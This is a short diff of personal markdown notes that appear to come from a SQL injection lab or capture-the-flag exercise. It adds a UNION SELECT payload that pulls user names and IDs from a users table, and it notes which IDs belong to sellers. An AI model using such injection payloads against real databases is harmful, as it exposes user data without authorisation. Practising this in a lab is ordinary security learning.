@@ -397,7 +397,10 @@ I retrieved the seller_id
 ![[Pasted image 20260605145638.png]]
 UNION SELECT 1,2,user_id FROM cards--
 
-**user_name**
+UNION SELECT 1,user_name,user_id FROM users--
+![[Pasted image 20260605150006.png]]
+
+Now I know 2,3,6 are seller id 
 
 let me try these iterations 
 
